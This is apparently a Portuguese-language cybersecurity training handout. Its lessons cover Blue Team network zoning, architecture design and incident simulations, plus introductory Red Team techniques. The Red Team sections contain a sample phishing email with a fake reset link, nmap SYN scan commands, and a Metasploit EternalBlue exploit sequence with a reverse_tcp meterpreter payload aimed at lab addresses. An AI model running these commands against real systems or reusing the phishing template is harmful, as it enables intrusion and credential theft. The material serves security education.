Segmentação e microsegmentação são pilares da defesa em profundidade. Para o Blue Team N1, aplicar esses princípios fortalece a rede contra ataques avançados, dificulta movimentos laterais e melhora a postura geral de segurança.

---


# 🔵 Blue Team N1: Zonas de Confiança e Controle de Acesso na Rede

Entender as zonas de confiança e implementar controles de acesso eficientes são etapas essenciais para proteger a rede e limitar o impacto de ataques. No Blue Team N1, esses conceitos ajudam a organizar a rede de forma segura e a aplicar políticas que minimizam riscos.

---

## 🧠 O que são zonas de confiança?

- Áreas ou segmentos da rede classificados conforme o nível de segurança e criticidade  
- Cada zona possui um grau diferente de confiança e políticas específicas de acesso  
- Exemplos comuns: zona interna segura, zona DMZ, zona externa (internet)  

---

## 🧱 Tipos comuns de zonas de confiança

```
- **Zona interna (trusted):** Rede corporativa segura com acesso restrito  
- **Zona desmilitarizada (DMZ):** Área pública que hospeda serviços acessíveis externamente, como servidores web  
- **Zona externa (untrusted):** Internet ou redes não confiáveis  
- **Zona de gestão:** Segmento reservado para administração e monitoramento  
```

---

## 🔍 Controle de acesso na rede

- Baseia-se em políticas que determinam quem pode acessar o quê, quando e como  
- Utiliza mecanismos como firewalls, listas de controle de acesso (ACLs), VLANs e NAC (Network Access Control)  
- Implementa princípios como “menor privilégio” e “deny by default”  

---

## ⚙️ Boas práticas para controle de acesso

```
- Segmentar a rede em zonas claras e aplicar regras restritivas entre elas  
- Monitorar e registrar tentativas de acesso para auditoria e análise  
- Usar autenticação forte e métodos de verificação para acesso a zonas sensíveis  
- Atualizar regularmente políticas e regras para se adaptar a novos riscos  
```

---

## ✅ Benefícios para o Blue Team

- Redução da superfície de ataque e limitação de movimentos laterais  
- Melhoria na detecção de atividades suspeitas e anômalas  
- Facilidade na gestão e resposta a incidentes  
- Cumprimento de requisitos de conformidade e auditoria  

---

## ✅ Conclusão

Zonas de confiança e controle de acesso são fundamentos da arquitetura de rede segura. Para o Blue Team N1, implementar esses conceitos é crucial para proteger ativos, controlar riscos e fortalecer a defesa em profundidade.

---

# 🔵 Blue Team N1: Prática – Desenhar uma Arquitetura Simples e Segura para Ambiente Corporativo

Desenhar uma arquitetura de rede segura é um passo fundamental para garantir a proteção dos ativos e a eficiência da defesa. Nesta prática, você vai criar um modelo básico que contempla segmentação, zonas de confiança e controles de acesso essenciais.

---

## 🧠 Objetivos da prática

- Aplicar conceitos de segmentação e zonas de confiança  
- Definir controles básicos de acesso entre segmentos  
- Criar um diagrama simples que represente a arquitetura segura  

---

## 🧱 Elementos principais para incluir no desenho

```
- Zona externa (Internet)  
- Firewall perimetral  
- Zona DMZ para serviços públicos (web, email)  
- Rede interna segmentada (usuários, servidores, gestão)  
- Controle de acesso entre zonas (firewalls, ACLs)  
- Monitoramento e logging  
```

---

## 🔍 Passos para criar sua arquitetura

```
1. Desenhe a internet como fonte externa  
2. Adicione firewall perimetral controlando o tráfego de entrada/saída  
3. Crie uma DMZ isolada para servidores acessíveis externamente  
4. Separe a rede interna em sub-redes: usuários, servidores, gestão  
5. Defina regras de firewall e ACLs entre essas zonas, seguindo princípio de menor privilégio  
6. Inclua sistemas de monitoramento para registrar e analisar tráfego  
```

---

## ⚙️ Exemplo simples (descrição textual)

- Internet → Firewall Perimetral → DMZ (servidores web, email)  
- Firewall → Rede Interna  
  - Sub-rede Usuários (acesso restrito)  
  - Sub-rede Servidores (restrito a usuários e gestão)  
  - Sub-rede Gestão (acesso exclusivo para admins)  

---

## ✅ Dicas para aprimorar

- Use ferramentas de diagramação como draw.io, Lucidchart ou Microsoft Visio  
- Considere adicionar IDS/IPS para monitoramento adicional  
- Pense em políticas de acesso baseadas em identidade e não só IP  
- Documente as regras e revise regularmente  

---

## ✅ Conclusão

Praticar o desenho de arquiteturas simples e seguras ajuda o Blue Team N1 a consolidar fundamentos e preparar defesas eficazes. A clareza e organização na rede são pilares para uma boa postura de segurança.

---

# 🔴 Red Team N1: Técnicas Ofensivas Básicas – Phishing, Engenharia Social, Scanning e Exploits Simples

No início da jornada no Red Team, é fundamental entender e praticar as técnicas ofensivas básicas. Essas habilidades são a base para ataques mais sofisticados e ajudam a compreender as fragilidades que podem ser exploradas em qualquer ambiente.

---

## 🧠 Visão geral das técnicas

- **Phishing:** Enganar usuários para obter credenciais ou informações sensíveis  
- **Engenharia Social:** Manipular pessoas para obter acesso ou informações  
- **Scanning:** Mapear redes, hosts e serviços para identificar pontos fracos  
- **Exploits simples:** Utilizar vulnerabilidades conhecidas para obter acesso ou executar código  

---

## 🧱 Técnicas detalhadas

### 1. Phishing

- Envio de e-mails ou mensagens fraudulentas com links ou anexos maliciosos  
- Uso de páginas falsas (fake login) para capturar dados  
- Testar awareness dos usuários com campanhas simuladas  

```

Exemplo básico de e-mail phishing:

Assunto: Atualização urgente da senha  
Corpo: "Olá, seu acesso foi bloqueado. Clique no link para redefinir: http://fakesite.com"

```

---

### 2. Engenharia Social

- Ligação ou conversa para obter informações confidenciais  
- Fingir ser um técnico, suporte ou colega para ganhar confiança  
- Explorar fraquezas humanas, como curiosidade ou medo  

---

### 3. Scanning

- Utilizar ferramentas como `nmap` para descobrir hosts e portas abertas  
- Identificar sistemas operacionais e serviços em execução  
- Detectar vulnerabilidades iniciais para exploração  

```

Comando básico:

```
nmap -sS -p 1-1000 192.168.1.0/24
```

---

### 4. Exploits Simples

- Utilizar vulnerabilidades conhecidas com ferramentas ou scripts prontos  
- Explorar falhas de software desatualizado ou configurações incorretas  
- Exemplo: uso do Metasploit para explorar vulnerabilidade SMB  

---

## ⚙️ Dicas para o Red Team N1

- Pratique sempre em ambientes controlados e autorizados  
- Entenda o impacto e as consequências de cada técnica  
- Documente seus passos para análise posterior e melhoria  
- Combine técnicas para aumentar a eficácia dos ataques  

---

## ✅ Conclusão

Dominar técnicas ofensivas básicas é essencial para o Red Team N1 criar uma base sólida e se preparar para desafios mais complexos. Com prática e estudo, é possível evoluir e contribuir efetivamente para o ciclo de segurança.

---

# 🔴 Red Team N1: Ferramentas Básicas – nmap e Metasploit

Para começar no Red Team, dominar ferramentas essenciais como **nmap** e **Metasploit** é fundamental. Elas permitem realizar reconhecimento, exploração e post-exploração em ambientes controlados, preparando você para ataques mais complexos.

---

## 🧠 Por que usar essas ferramentas?

- **nmap:** Scanner de redes para mapear hosts, portas abertas e serviços  
- **Metasploit:** Framework para exploração de vulnerabilidades e criação de payloads  
- Ambas são amplamente usadas por profissionais e facilitam a automação de ataques  

---

## 🧱 Ferramenta 1: nmap

- Permite descobrir dispositivos e serviços ativos na rede  
- Detecta sistemas operacionais e versões de software  
- Suporta varreduras rápidas e detalhadas  

```

Exemplo básico:

```
nmap -sS -p 1-1000 192.168.1.0/24
```

---

## 🧱 Ferramenta 2: Metasploit Framework

- Plataforma para desenvolvimento e execução de exploits  
- Contém módulos para scanners, payloads, pós-exploração e mais  
- Pode ser usada via interface gráfica (`msfconsole`) ou scripts  

```

Comandos iniciais:

```
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.50
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
exploit
```

---

## ⚙️ Dicas para iniciantes

- Sempre use em ambientes autorizados e de teste  
- Combine nmap para reconhecimento e Metasploit para exploração  
- Estude cada módulo do Metasploit para entender seu funcionamento  
- Documente suas atividades para aprendizado e segurança  

---

## ✅ Conclusão

nmap e Metasploit são ferramentas pilares para o Red Team N1. Dominar seu uso básico abre portas para técnicas ofensivas mais avançadas e consolida a base para seu crescimento na área.

---

# 🔴 Red Team N1: Prática – Executar Scan Básico e Entender o Impacto na Defesa

Realizar scans de rede é um dos primeiros passos para reconhecimento em testes ofensivos. Porém, é importante compreender como essa atividade pode ser percebida e respondida pelo Blue Team, para ajustar táticas e evitar detecção precoce.

---

## 🧠 Objetivo da prática

- Executar um scan básico usando nmap  
- Observar os logs e alertas gerados nos sistemas de defesa  
- Entender como o Blue Team pode detectar e reagir a esses scans  

---

## 🧱 Ferramentas necessárias

- Máquina com nmap instalado (ex: Kali Linux)  
- Ambiente de laboratório com firewall, IDS/IPS e SIEM (ex: Security Onion)  
- Acesso aos logs de segurança para análise  

---

## 🔍 Passo a passo do scan básico

```

# Executar scan SYN nas portas mais comuns na rede alvo
nmap -sS -p 1-1000 192.168.1.100

```

- Use o parâmetro `-sS` para scan furtivo (SYN scan)  
- Alvo: IP do host que será analisado  
- Observe os resultados: portas abertas, serviços e versões  

---

## 🔍 Observando o impacto na defesa

```

# No ambiente Blue Team, verifique:
- Logs de firewall para tentativas de conexão  
- Alertas no IDS/IPS indicando comportamento suspeito  
- Notificações e correlações no SIEM  
- Acionamento de playbooks de resposta automatizada (se houver)  
```

---

## ⚙️ Discussão

- Scans podem ser detectados como atividades suspeitas ou ataques pré-ativos  
- Blue Team pode bloquear IPs, gerar alertas e iniciar investigações  
- Técnicas de evasão podem ser usadas para reduzir a detecção (ex: timing, fragmentação)  

---

## ✅ Conclusão

Executar scans é essencial para o Red Team, mas entender como a defesa reage é igualmente importante para ajustar estratégias e evitar bloqueios precoces. Essa prática ajuda a equilibrar agressividade e furtividade nos testes.

---

# 🔵 Blue Team N1: Participar ou Criar Exercícios de Simulação de Incidentes (Phishing, Ransomware)

Exercícios de simulação são ferramentas poderosas para preparar equipes para incidentes reais. Eles ajudam a validar processos, identificar gaps e melhorar a colaboração entre times. No Blue Team N1, participar e criar esses exercícios é fundamental para aprimorar a resposta a ameaças.

---

## 🧠 Por que simular incidentes?

- Treinar a equipe em um ambiente controlado  
- Avaliar a eficácia das políticas e ferramentas  
- Melhorar a comunicação e coordenação entre áreas  
- Detectar falhas e pontos de melhoria  

---

## 🧱 Tipos comuns de simulações

### 1. Phishing

- Envio de e-mails simulados para testar a conscientização dos usuários  
- Monitoramento das interações e respostas  
- Treinamento com feedback e reforço positivo  

---

### 2. Ransomware

- Simulação de ataque para testar resposta e recuperação  
- Avaliação de backup, isolamento e comunicação  
- Teste da eficácia do playbook de resposta a incidentes  

---

## 🔍 Como criar um exercício simples

```

1. Defina o objetivo do exercício (ex: testar resposta a phishing)  
2. Planeje o cenário e a duração  
3. Prepare os recursos (e-mails simulados, artefatos, alertas falsos)  
4. Envolva todas as partes interessadas (TI, comunicação, gestão)  
5. Execute a simulação com monitoramento e suporte  
6. Realize um debrief para analisar resultados e lições aprendidas  

```

---

## ⚙️ Boas práticas

```

- Garanta que o exercício não cause impactos reais nos sistemas  
- Comunique a liderança sobre a simulação para apoio  
- Use ferramentas especializadas para envio e monitoramento  
- Documente o processo e os resultados para melhoria contínua  

```

---

## ✅ Benefícios para o Blue Team

- Melhora a prontidão e capacidade de resposta  
- Fortalece a cultura de segurança na organização  
- Reduz o tempo de detecção e mitigação de incidentes  
- Facilita a identificação de falhas em processos e tecnologias  

---

## ✅ Conclusão

Exercícios de simulação são essenciais para o desenvolvimento do Blue Team N1. Eles transformam teoria em prática, preparando a equipe para enfrentar ameaças reais com confiança e eficiência.

---

# 🔵 Blue Team N1: Analisar Respostas e Identificar Pontos de Melhoria

Analisar as respostas a incidentes é fundamental para aprimorar a segurança e aumentar a eficácia da equipe. Para o Blue Team N1, esse processo permite entender onde houve falhas, otimizar procedimentos e fortalecer a defesa.

---

## 🧠 Por que analisar respostas?

- Avaliar a eficiência das ações tomadas  
- Detectar gargalos e atrasos no processo  
- Identificar falhas técnicas e humanas  
- Gerar aprendizado contínuo para prevenção  

---

## 🧱 Passos para análise eficaz

```

1. Coletar evidências e registros do incidente  
2. Revisar o timeline das ações realizadas  
3. Avaliar o cumprimento dos playbooks e procedimentos  
4. Entrevistar envolvidos para entender dificuldades  
5. Mapear causas raízes dos problemas detectados  
6. Priorizar pontos de melhoria com base no impacto  

```

---

## 🔍 Exemplos comuns de pontos de melhoria

- Tempo excessivo para detecção ou contenção  
- Falta de automação em tarefas repetitivas  
- Comunicação ineficiente entre equipes  
- Gaps no treinamento e conscientização  
- Deficiências em ferramentas ou infraestrutura  

---

## ⚙️ Como implementar melhorias

```

- Atualizar e testar playbooks e runbooks regularmente  
- Investir em treinamentos e simulações frequentes  
- Automatizar processos sempre que possível  
- Melhorar canais e processos de comunicação  
- Revisar e otimizar arquitetura e ferramentas de segurança  

```

---

## ✅ Benefícios para o Blue Team

- Respostas mais rápidas e eficazes a incidentes  
- Redução do impacto e tempo de inatividade  
- Maior confiança e preparo da equipe  
- Evolução constante da postura de segurança  

---

## ✅ Conclusão

Analisar respostas e identificar pontos de melhoria são práticas essenciais para o crescimento do Blue Team N1. Essa cultura de aprendizado contínuo fortalece a segurança da organização e prepara o time para novos desafios.

---

# 🔵 Blue Team N1: Prática – Montar Relatório e Lições Aprendidas Após o Simulado

A elaboração de relatórios detalhados e a documentação das lições aprendidas são etapas fundamentais para garantir o aprimoramento contínuo da equipe e da segurança da organização. Após um exercício simulado, esse processo ajuda a consolidar conhecimentos e ajustar estratégias.

---

## 🧠 Objetivos da prática

- Documentar todo o fluxo do simulado  
- Identificar sucessos e falhas durante o exercício  
- Registrar recomendações e ações para melhoria  

---

## 🧱 Estrutura básica do relatório

```

1. **Introdução**  
   - Objetivo do simulado  
   - Data e participantes  

2. **Descrição do cenário**  
   - Tipo de ataque simulado (phishing, ransomware, etc.)  
   - Ferramentas e técnicas usadas  

3. **Cronograma e execução**  
   - Sequência das ações e respostas  
   - Tempo gasto em cada etapa  

4. **Análise dos resultados**  
   - Pontos fortes identificados  
   - Falhas e dificuldades encontradas  

5. **Lições aprendidas**  
   - Recomendações para melhorias técnicas e de processos  
   - Sugestões para treinamentos futuros  

6. **Conclusão**  
   - Resumo do impacto do simulado  
   - Próximos passos  

```

---

## 🔍 Dicas para elaboração

```

- Seja claro e objetivo na escrita  
- Use gráficos e tabelas para facilitar a visualização  
- Inclua evidências relevantes (logs, capturas de tela)  
- Envolva todos os participantes na revisão do relatório  

```

---

## ⚙️ Benefícios do relatório

- Facilita a comunicação com a gestão e outras áreas  
- Serve como base para aprimorar a postura de segurança  
- Permite comparar resultados em simulados futuros  
- Fortalece a cultura de aprendizado e melhoria contínua  

---

## ✅ Conclusão

Montar um relatório detalhado com lições aprendidas é uma prática essencial para o Blue Team N1. Esse documento orienta a evolução da equipe e da organização, transformando experiências em conhecimento valioso.

---
